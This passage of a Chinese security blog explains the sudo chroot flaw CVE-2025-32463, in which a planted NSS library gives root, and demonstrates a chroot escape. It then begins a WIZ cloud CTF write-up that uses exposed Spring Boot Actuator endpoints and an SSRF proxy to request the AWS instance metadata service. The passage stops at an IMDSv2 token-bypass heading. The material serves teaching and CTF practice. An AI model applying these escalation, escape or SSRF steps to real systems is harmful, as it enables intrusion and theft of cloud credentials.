文件控制了系统如何查询用户、组等信息。下述文件内容表示系统会用<code>files</code>和<code>ldap</code> 两种方式来查找用户信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd: files ldap<br></code></pre></td></tr></table></figure><p>如图 11 所示，我们之所以在 创建一个和 <code>hacker</code> 在同一级目录的 <code>libnss_</code> 目录，是因为恶意库是在代码退出 <code>chroot</code> 后加载的，且<a href="https://github.com/bminor/glibc/blob/ea85e7d55087075376a29261e722e4fae14ecbe7/nss/nss_module.c#L180" title="glibc">glibc</a>（C 标准库）内部的 NSS 加载逻辑是硬编码的，它要求：所有 NSS 模块的名字格式必须是<code>libnss_&lt;source&gt;.so.&lt;version&gt;</code>。</p><p><img src="/image/image_kj7c-Nr14J.png" alt="图 34：glibc 内部的 NSS 加载逻辑是硬编码的" title="图 34：glibc 内部的 NSS 加载逻辑是硬编码的"></p><p>我们在自定义 NSS 模块名时必须有<code>/</code> ，是因为连接的名称传递给<a href="https://man7.org/linux/man-pages/man3/dlopen.3.html" title="dlopen">dlopen</a>时，dlopen 会将 <code>/</code> 解析为（相对或绝对）路径名。从而到我们自定义的目录中加载恶意动态链接库。</p><p><img src="/image/image_uHiP9fGfj_.png" alt="图 35：dlopen 会将  &#x2F;  解析为（相对或绝对）路径名" title="图 35：dlopen 会将  &#x2F;  解析为（相对或绝对）路径名"></p><p>正因如此，任何本地用户都可以诱使 <code>sudo</code> 加载任意的共享对象，从而以 <code>root</code> 权限执行任意代码。下面的调用栈显示了一个被 <code>sudo</code> 加载的恶意共享对象（为简洁起见，内容已被大幅精简）。</p><p>由于这种行为，任何本地用户都可以诱使 <code>sudo</code> 加载任意的共享对象，从而实现以 <code>root</code> 权限执行任意代码。官方所提供的调用栈显示了 <code>sudo</code> 加载的恶意共享对象（为简洁起见，该栈信息已被大量精简）。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">#0  0x0000763a155db181 in woot () from libnss_/woot1337.so.2<br>#1  0x0000763a1612271f in call_init<br>#8  0x0000763a1612a164 in _dl_open (file=&quot;libnss_/woot1337.so.2&quot;, <br>#14 0x0000763a15f53a0f in module_load<br>#15 0x0000763a15f53ee5 in __nss_module_load<br>#17 0x0000763a15f5460b in __GI___nss_lookup_function<br>#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2<br>#20 0x0000763a15f62628 in __getpwnam_r <br>#21 0x0000763a15d59ae8 in pam_modutil_getpwnam<br>#27 0x0000763a15d58d99 in pam_acct_mgmt<br>#28 0x0000763a1577e491 in sudo_pam_approval<br>#29 0x0000763a157ce3ef in sudo_auth_approval<br>#30 check_user.constprop.0<br>#32 0x0000763a15799143 in sudoers_check_cmnd<br>#33 sudoers_policy_check<br>#34 0x00005ba00874b491 in policy_check<br>#35 main<br></code></pre></td></tr></table></figure><p>此<a href="https://github.com/sudo-project/sudo/commit/fffcc07c536d8eb69df4fb2d24a094982b09086c" title="补丁">补丁</a>本质上回退到了 <code>sudo</code> 1.9.14 中实现的更改。<code>pivot_root()</code>和<code>unpivot_root()</code>函数被移除，并且在命令匹配阶段不再调用<code>chroot()</code>。应用补丁后，漏洞利用将失败，因为不再调用<code>chroot()</code>。</p><p><img src="/image/image_zjRVFNRVfB.png" alt="图 36：CVE-2025-32463 的补丁" title="图 36：CVE-2025-32463 的补丁"></p><h2 id="0x03-chroot-的安全隔离性评估"><a href="#0x03-chroot-的安全隔离性评估" class="headerlink" title="0x03 chroot 的安全隔离性评估"></a>0x03 chroot 的安全隔离性评估</h2><p>前面我们发现，<code>sudo</code> 的 <code>--chroot</code> 参数的实现函数名称虽然是<code>pivot_root()</code>，但实际上是直接调用了<code>chroot</code> 来实现的。由于海报宣传我们不仅需要了解容器实现的底层原理，还需要评估 <code>chroot</code> 的安全隔离性。最后，让我们：</p><ul><li>通过在 ubuntu 主机上运行 Alpine 来解释容器实现的底层原理；</li><li>学习 <code>chroot</code>常见的两个风险：不清理环境变量和 <code>chroot</code> 越狱；</li><li>现代容器实现根目录切换的技术。</li></ul><h3 id="3-1-实验：在-ubuntu-主机上运行-Alpine"><a href="#3-1-实验：在-ubuntu-主机上运行-Alpine" class="headerlink" title="3.1 实验：在 ubuntu 主机上运行 Alpine"></a>3.1 实验：在 ubuntu 主机上运行 Alpine</h3><p>众所周知，容器其实只是宿主机上一个特殊的进程，当我们创建一个容器时，这个容器、也就是这个进程的根（root）目录就会被更改。所以在容器内部，我们是看不到完整的宿主机的文件系统的。接下来，我们做一个小实验，那就是：通过使用<code>chroot</code> 在宿主机上运行 Alpine。</p><p>容器是镜像实例化的结果，所以镜像需要封装容器所需要的文件系统，若该文件系统没有所要运行的可执行文件，那么容器将无法找到并运行它们。</p><ol><li><p>根据系统架构，到官网下载一个特定版本的最小化根文件系统，并保存为 <code>alpine.tar.gz</code> 压缩包。这里以 <code>v3.9</code> 版本为例进行说明。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">arch</span>=$(<span class="hljs-built_in">uname</span> -m); curl -o alpine.tar.gz http://dl-cdn.alpinelinux.org/alpine/v3.9/releases/<span class="hljs-variable">$arch</span>/alpine-minirootfs-3.9.0-<span class="hljs-variable">$arch</span>.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>创建一个新目录，作为 <code>alpine</code> 的根目录，并将压缩包解压至新的根目录中，这样我们就可以得到一个最小化的 Linux 发行版文件系统了。由于压缩包的 <code>/dev</code> 目录包含一些设备文件等特殊文件，所以<code>tar</code> 在解压过程中会报错。在这里，暂时使用 <code>--exclude=&#39;./dev/*&#39;</code> 来忽略这些文件即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> alpine<br>tar --exclude=<span class="hljs-string">&#x27;./dev/*&#x27;</span> -xvf alpine.tar.gz -C alpine<br></code></pre></td></tr></table></figure></li><li><p>由于 Alpine 发行版不包含 <code>bash</code> ，所以不指定任何命令，直接执行 <code>chroot</code> 命令会报错。但如果我们在包含 <code>bash</code> 的 Linux 发行版（例如 ubuntu）中执行同样的操作就会成功。在这里，执行 <code>chroot</code> 命令时，指定 <code>sh</code> 即可解决问题。</p></li></ol><p><img src="/image/image_yTKKNRaN0K.png" alt="图 37：在 ubuntu 主机上运行 Alpine Linux 系统" title="图 37：在 ubuntu 主机上运行 Alpine Linux 系统"></p><p>如图 37 所示，<code>alpine</code> 中的内容看起来就像是一个 Linux 文件系统的根目录，其中包含了 <code>bin</code> 、<code>lib</code> 、<code>var</code> 和 <code>tmp</code> 等目录。通过使用 <code>chroot</code> 命令过后，我们就可以在主机上运行一个简单的 Alpine 了。其实这也正是容器所做的事情，然而 <code>chroot</code> 背后所做的事情比想象中的要稍微复杂一些，这里我们就不展开进行说明了。</p><p>稍微总结一下，<code>chroot</code> 主要的功能就是更改当前进程的根目录。当根目录被更改后，当前进程及其子进程只能访问比新根目录层次更低的文件和目录。但是 <code>chroot</code>命令不隔离内核能力、不清理环境变量、以及不屏蔽系统调用权限，导致用户在仍然可以通过各种方式“打破沙箱”。</p><h3 id="3-2-风险一：环境变量"><a href="#3-2-风险一：环境变量" class="headerlink" title="3.2 风险一：环境变量"></a>3.2 风险一：环境变量</h3><p>首先，我们来回答刚刚遗留的一个问题：如图 37 所示，为什么执行<code>chroot</code>不追加命令会运行失败。那是因为，当我们执行<code>chroot</code> 命令时，只是改变了当前进程的路径解析过程，<code>chroot</code> 的子进程仍会继承父进程的环境变量。</p><p>例如，我可以在主机上设置环境变量 <code>NAME</code> 的值为 <code>Yaney</code> ，然后使用 <code>chroot</code> 切换到 Alpine 的文件系统中，接着我们就会发现：环境变量 <code>NAME</code> 已被继承。</p><p><img src="/image/image_R7fVyAYU_m.png" alt="图 38：chroot 不会清理环境变量" title="图 38：chroot 不会清理环境变量"></p><p>正如 <code>chroot</code> 的手册所说的那样，若我们没有追加任何命令，那么它会使用 <code>$SHELL</code> 的值。如图 39 所示，<code>$SHELL</code>  的值在我们的 Ubuntu 主机上已经被设置为 <code>/bin/bash</code> 了，<code>chroot</code> 的子进程会继承这个环境变量，继续寻找<code>/bin/bash</code> ，但 Alpine 并没有这个文件，所以命令执行失败。</p><p><img src="/image/image_dxmCBrfNGX.png" alt="图 39：chroot 环境会继承原来的 $SHELL 和 $PATH，因此无法找到对应的文件" title="图 39：chroot 环境会继承原来的 $SHELL 和 $PATH，因此无法找到对应的文件"></p><p>此外，若我们想执行 <code>ls</code> 等常见的可执行文件，也无需显示地指定其路径。因为在主机和 <code>chroot</code> 环境中，<code>PATH</code> 的值并未被改变。只不过在 <code>chroot</code> 环境中，<code>alpine</code> 根目录中的 <code>bin</code> 目录被解析成了新进程的 <code>/bin</code> 目录，该目录已包含了 <code>ls</code> 等常见的可执行文件，</p><p><img src="/image/image_GJouvfQyMF.png" alt="图 40：Alpine 的 chroot 环境中存在的文件" title="图 40：Alpine 的 chroot 环境中存在的文件"></p><p>需要注意的是，只有子进程才会获得新的根目录，在图 41 的例子中，指的是运行 <code>ls</code>、<code>sh</code> 和 <code>cat</code> 这些进程。只有执行 <code>exit</code> 结束 <code>sh</code> 进程后，控制权才会返还给父进程。</p><p><img src="/image/image_LDVxLo4-Rm.png" alt="图 41：只有退出 chroot 环境，控制器才会返回给父进程" title="图 41：只有退出 chroot 环境，控制器才会返回给父进程"></p><p>从上面的例子中，我们发现 <code>chroot</code> 只会改变路径解析过程，而不会做其它任何事情，因此它不适合沙箱化一个进程，因为它也不会限制文件系统的系统调用。这也是<a href="https://man7.org/linux/man-pages/man2/chroot.2.html" title="《chroot(2) — Linux manual page》">《chroot(2) — Linux manual page》</a>明确指出的事情。</p><p><img src="/image/image_DG6iu7M3JO.png" alt="图 42：chroot 不适合完全沙箱化一个进程" title="图 42：chroot 不适合完全沙箱化一个进程"></p><h3 id="3-3-风险二：chroot-越狱"><a href="#3-3-风险二：chroot-越狱" class="headerlink" title="3.3 风险二：chroot 越狱"></a>3.3 风险二：chroot 越狱</h3><p>在过去的系统中，守护进程为了提高安全性，会使用 <code>chroot</code> 来限制自己访问的文件系统的范围。但如果一个文件夹被移出了 <code>chroot</code> 环境，那么攻击者可以利用这一点来进行越狱。我们来举个最简单的例子：</p><ol><li><p>打开一个终端，进入 <code>alpine</code> 的 <code>chroot</code> 环境中；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> alpine sh<br></code></pre></td></tr></table></figure></li><li><p>创建一个新的目录 <code>will_be_move</code>，并将其设置为当前工作目录；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> will_be_move <br><span class="hljs-built_in">chdir</span> will_be_move<br></code></pre></td></tr></table></figure></li><li><p>然后，打开一个新的终端，将 <code>will_be_move</code>目录移出<code>chroot</code>环境中；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> alpine/will_be_move ./<br></code></pre></td></tr></table></figure></li><li><p>这样，我们就逃逸到主机环境中了，并且可以通过 <code>…/</code>来查看主机上的文件。</p></li></ol><p><img src="/image/image_EAbock-kFB.png" alt="图 43：chroot 越狱" title="图 43：chroot 越狱"></p><h3 id="3-4-pivot-root-系统调用"><a href="#3-4-pivot-root-系统调用" class="headerlink" title="3.4 pivot_root 系统调用"></a>3.4 <code>pivot_root</code> 系统调用</h3><p>除了我们熟悉的<code>chroot</code>，还有一个类似的系统调用叫做<code>pivot_root</code>。这两者的目标其实是一样的：给容器一个“自己的根目录”，就像我们把容器放在一个独立的小世界里。</p><p>在今天的分享中，我们选择用大家更熟悉的<code>chroot</code>来做演示，因为它更容易理解。但请记住，无论是<code>chroot</code>还是<code>pivot_root</code>，核心目的都是让容器有一套独立的根文件系统，只是实现方式不同。</p><p>简单来说，<code>pivot_root</code> 可以把当前的根目录挪到一个叫<code>put_old</code> 的临时目录里，然后把新的目录<code>new_root</code> 设置为整个系统的新“地基”。这样一来，进程看到的根目录就完全变了。需要注意的是：<code>new_root</code>和<code>put_old</code> 不能是同一个文件系统中的目录，这样做是为了避免混乱和安全问题。</p><p><code>chroot</code> 更像是“换个窗户看世界”，而 <code>pivot_root</code> 是“连地基一起搬家”。所以在真正的容器环境里，比如 Docker 或 Kubernetes 后面的底层运行时，大家更倾向于使用<code>pivot_root</code> 来设置容器的根文件系统，因为这样更安全、更彻底。</p><p>以 <a href="https://github.com/opencontainers/runc/blob/34c64e2a7f0695ac300bb4f1cb9375172b889148/libcontainer/rootfs_linux.go#L210" title="runc">runc</a> 为例，我们在查看其源代码的时候，就发现它使用的是 <code>pivot_root</code> 而不是 <code>chroot</code>。因为绝大多数情况下 <code>config.Namespaces.Contains(configs.NEWNS)</code>的值为 <code>true</code>，因为容器运行时的默认行为就是启用挂载命名空间（mount namespace）。这时候就可以放心使用<code>pivot_root</code> 去彻底换根，而不会影响其他进程。</p><p><img src="/image/image_QA7YDCrzgQ.png" alt="图 44：runc 准备根文件系统的核心代码" title="图 44：runc 准备根文件系统的核心代码"></p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
      <tag>CVE 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WIZ-2025 竞标赛 - 第一期 (June)</title>
    <link href="/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/"/>
    <url>/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WIZ 这家公司大家并不陌生，作为云原生安全领域的领军者和云研究学习的殿堂级机构，它每年都会凭借“赛博佛祖”般的创新力推出全新的线上云 CTF 比赛。</p><p>自今年六月起，一场为期数月的 CTF 锦标赛正式拉开帷幕。这场赛事由 WIZ 明星研究员精心打造，旨在帮助参赛者磨练技能。完成挑战即可赢取积分，冲击排行榜，角逐终极云冠军的荣誉。</p><p><img src="/image/image_9PGoFKp3sU.png" alt="图 1：WIZ 推出的 CTF 锦标赛" title="图1：WIZ 推出的 CTF 锦标赛"></p><p>笔者自然不会错过任何一期。接下来，我们将一同探讨最新一期，也是第一期的比赛，其主题为：Perimeter Leak（周边泄漏）。</p><blockquote><p>🎯点击【<a href="https://cloudsecuritychampionship.com/challenge/1" title="阅读原文">题目链接</a>】，立即进入比赛环境。</p></blockquote><h2 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h2><p>经过几周的漏洞利用和权限提升，你终于拿到了一个服务器的访问权限，希望这就是最后一个目标服务器，并能借此从一个<strong>S3 存储桶中提取出隐藏的 flag</strong>。</p><p>但事情不会那么简单。目标环境使用了<strong>AWS 数据边界（data perimeter）来限制对该存储桶内容的访问</strong>。祝你好运！</p><p>你发现了一个<strong>部署在 AWS 上的 Spring Boot Actuator 应用</strong>，可以通过以下命令访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com<br><br></code></pre></td></tr></table></figure><p>返回结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UP&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>这表示应用当前处于运行中 状态。</p><blockquote><p>🐱<strong>友情提示<br>数据边界（Data Perimeter）</strong> 是一种策略组合，用来限制谁可以访问哪些数据，在哪些网络条件下可以访问，访问行为是否合规，从而保证数据不会逃离你信任的范围。</p></blockquote><p><img src="/image/image_WgqZ1d7P6u.png" alt="图 2：Perimeter Leak 的题目描述" title="图2：Perimeter Leak的题目描述"></p><p>根据题目描述，我们总结出以下三点关键信息：</p><ol><li>“S3 存储桶中提取出隐藏的 flag”：flag 存储在 S3 中；</li><li>“使用了 AWS 数据边界（data perimeter）来限制对该存储桶内容的访问”：需要获取相关凭证以实现权限提升；</li><li>“部署在 AWS 上的 Spring Boot Actuator 应用”：会联想到 Spring Boot Actuator 可能因为 API 接口配置不当，暴露一些敏感信息。</li></ol><blockquote><p>🐱<strong>友情提示</strong></p><p>之前曾向某位大佬请教过，他表示：“在 Spring Boot 中，内存泄漏的实际案例虽然较为少见，但一旦发生，往往会带来严重后果。”因此，在处理 Spring Boot 相关问题时，大家务必保持高度警惕，切勿掉以轻心。</p></blockquote><h2 id="0x02-解题过程"><a href="#0x02-解题过程" class="headerlink" title="0x02 解题过程"></a>0x02 解题过程</h2><h3 id="2-1-环境探测：通过-Actuator-接口获取敏感信息"><a href="#2-1-环境探测：通过-Actuator-接口获取敏感信息" class="headerlink" title="2.1 环境探测：通过 Actuator 接口获取敏感信息"></a>2.1 环境探测：通过 Actuator 接口获取敏感信息</h3><p>首先，我们可以搜索一些因 Spring Boot 暴露 Actuator 接口而导致信息泄露、权限提升甚至远程代码执行（RCE）的文章。例如：</p><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit/" title="《Spring Boot Vulnerability Exploit Check List》">《Spring Boot Vulnerability Exploit Check List》</a></li><li><a href="https://www.freebuf.com/news/234266.html" title="《Spring Boot Actuator 漏洞利用》">《Spring Boot Actuator 漏洞利用》</a></li><li><a href="https://blog.csdn.net/god_zzZ/article/details/122837698" title="《Spring Boot Actuator 漏洞复现合集》">《Spring Boot Actuator 漏洞复现合集》</a></li></ul><p>在查看 <code>/actuator/env</code>接口时，我们发现了一些有趣的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_kMc8NjFEhw.png" alt="图 3： &#x2F;actuator&#x2F;env 接口返回了一些有趣的信息" title="图3： &#x2F;actuator&#x2F;env 接口返回了一些有趣的信息"></p><p>输出内容中包含大量无关信息，我们重点关注是否能够找到 S3 存储桶名称。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET<br></code></pre></td></tr></table></figure><p><img src="/image/image_V1u98IT3DS.png" alt="图 4：从 &#x2F;actuator&#x2F;env 接口中获取了 S3 存储桶名称" title="图4：从 &#x2F;actuator&#x2F;env 接口中获取了S3 存储桶名称"></p><h3 id="2-2-盲探尝试：无法匿名访问存储桶"><a href="#2-2-盲探尝试：无法匿名访问存储桶" class="headerlink" title="2.2 盲探尝试：无法匿名访问存储桶"></a>2.2 盲探尝试：无法匿名访问存储桶</h3><p>成功找到 S3 存储桶名称后，尝试进行匿名访问，但未能成功。接下来，我们需要获取相应的 IAM 凭证，以便访问存储桶中的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711/ --no-sign-request<br></code></pre></td></tr></table></figure><p><img src="/image/image_3JMiuQRMGg.png" alt="图 5：匿名访问名为 challenge01-470f711 的 S3 存储桶失败" title="图5：匿名访问名为 challenge01-470f711 的S3 存储桶失败"></p><h3 id="2-3-接口发现：寻找更多可用的-Actuator-接口"><a href="#2-3-接口发现：寻找更多可用的-Actuator-接口" class="headerlink" title="2.3 接口发现：寻找更多可用的 Actuator 接口"></a>2.3 接口发现：寻找更多可用的 Actuator 接口</h3><p>在权限受限的情况下，可以编写一个 shell 脚本，通过批量执行 <code>curl</code> 命令检查返回的状态码，以此判断哪些 API 接口能够获取有效信息。然而，目前所有请求均返回 <code>404</code> 错误。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_qF-Uh5Hp_w.png" alt="图 6：对 Actuator 接口进行批量请求，可均返回 404 错误" title="图6：对 Actuator 接口进行批量请求，可均返回 404 错误"></p><p>可当我们访问 <code>/actuator/mappings</code> 接口时，返回了一些有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_qJp3lMQo99.png" alt="图 7：访问 &#x2F;actuator&#x2F;mappings 接口时，返回了大量的信息" title="图 7 ： 访问 &#x2F;actuator&#x2F;mappings 接口时，返回了大量的信息"></p><p>通过分析 Spring Boot 应用的接口元信息，我们识别出了存在 SSRF 漏洞的 <code>/proxy</code> 接口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]<br></code></pre></td></tr></table></figure><p><img src="/image/image_XcslrDGSsP.png" alt="图 8：&#x2F;proxy 接口存在 SSRF 漏洞" title="图8：&#x2F;proxy 接口存在 SSRF 漏洞"></p><h4 id="理由一：路径和参数定义暴露-SSRF-入口"><a href="#理由一：路径和参数定义暴露-SSRF-入口" class="headerlink" title="理由一：路径和参数定义暴露 SSRF 入口"></a>理由一：路径和参数定义暴露 SSRF 入口</h4><p>包含一个名为<code>/proxy</code> 的 HTTP 路由，它要求必须带有<code>url</code> 参数，且很有可能是通过<code>GET /proxy?url=http://example.com</code> 这样的形式使用；</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;predicate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; [/proxy], params [url]&#125;&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="理由二：处理逻辑暴露服务器发起请求行为"><a href="#理由二：处理逻辑暴露服务器发起请求行为" class="headerlink" title="理由二：处理逻辑暴露服务器发起请求行为"></a>理由二：处理逻辑暴露服务器发起请求行为</h4><p>该请求由<code>challenge.Application</code>类中的<code>proxy(String)</code> 方法处理，<code>proxy(String)</code>意味着整个方法只接收一个字符串参数（这个参数就是用户传入的<code>url</code>），根据<code>descriptor</code> 字段得知方法返回类型是<code>String</code>。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;challenge.Application#proxy(String)&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;descriptor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="理由三：接口没有任何访问限制或校验条件"><a href="#理由三：接口没有任何访问限制或校验条件" class="headerlink" title="理由三：接口没有任何访问限制或校验条件"></a>理由三：接口没有任何访问限制或校验条件</h4><p>没有任何<code>headers</code>、<code>methods</code>或<code>consumes</code> 限制，只要满足<code>/proxy?url=xxx</code> 形式就能触发。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;requestMappingConditions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;consumes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;methods&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;url&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;negated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/proxy&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;produces&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-SSRF-成立：向-IMDS-发起请求"><a href="#2-4-SSRF-成立：向-IMDS-发起请求" class="headerlink" title="2.4 SSRF 成立：向 IMDS 发起请求"></a>2.4 SSRF 成立：向 IMDS 发起请求</h3><p>前面我们已经知道该应用运行在 EC2 上，这自然让我们联想到通过 SSRF 漏洞访问实例<strong>元数据服务（Instance Metadata Service，简称 IMDS）</strong>。</p><p>IMDS 是 EC2 实例用于获取 IAM 临时凭证、实例 ID 和 AMI 等自身元数据的接口。共有 IMDSv1 和 IMDSv2 两个版本：</p><ul><li>IMDSv1：通过<code>http://169.254.169.254/latest/meta-data/</code> 直接访问，无需验证。</li><li>IMDSv2：引入了 token-based 认证机制，要求先通过<code>PUT</code> 请求获取 token，然后带上 token 访问元数据。</li></ul><p>于是，我们通过 SSRF 漏洞直接访问<code>http://169.254.169.254/latest/meta-data</code> 接口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/<br></code></pre></td></tr></table></figure><p><img src="/image/image_ffwB3cAs_K.png" alt="图 9：通过 IMDSv1 访问 EC2 实例元数据失败" title="图9：通过 IMDSv1 访问 EC2 实例元数据失败"></p><p>接口返回<code>HTTP 401 Unauthorized</code>，这表明 EC2 实例启动的是 IMDSv2，我们需要获取 token，再访问数据。IMDSv2 是对 IMDSv1 的安全增强版本，通过引入 token 机制，防止 SSRF 等攻击窃取实例元数据（尤其是 IAM 凭证）。</p><blockquote><p>🐱<strong>友情提示</strong></p><p>169.254.169.254 是一个 AWS 云平台保留的本地地址，专门用于在实例内部访问元数据服务，它不会出现在公网路由中，是云计算安全与自动化的重要基础设施之一。详情请看 AWS 官方知识中心<a href="https://repost.aws/knowledge-center/ec2-linux-metadata-retrieval" title="《How do I troubleshoot instance metadata issues on my EC2 Linux instance?》">《How do I troubleshoot instance metadata issues on my EC2 Linux instance?》</a></p></blockquote><h3 id="2-5-获取-Token：绕过-IMDSv2-安全机制"><a href="#2-5-获取-Token：绕过-IMDSv2-安全机制" class="headerlink" title="2.5 获取 Token：绕过 IMDSv2 